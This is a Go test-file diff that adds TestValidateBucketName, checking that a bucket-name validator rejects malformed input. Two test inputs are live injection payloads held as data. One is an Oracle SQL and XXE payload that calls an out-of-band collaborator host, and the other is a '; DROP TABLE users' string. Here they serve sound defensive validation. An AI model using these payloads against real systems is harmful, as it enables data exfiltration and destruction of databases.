@@ -934,3 +934,45 @@ func TestValidateMetadata(t *testing.T) {
 		})
 	}
 }
+
+func TestValidateBucketName(t *testing.T) {
+	t.Parallel()
+
+	type tcase struct {
+		name  string
+		input string
+		err   error
+	}
+
+	tcases := []tcase{
+		{
+			name:  "empty string",
+			input: "",
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "too long",
+			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "unexpected symbol",
+			input: `; DROP TABLE users`,
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "correct",
+			input: "aaa-12-d.e",
+			err:   nil,
+		},
+	}
+
+	for _, tc := range tcases {
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateBucketName(tc.input)
+			assert.ErrorIs(t, err, tc.err)
+		})
+	}
+}
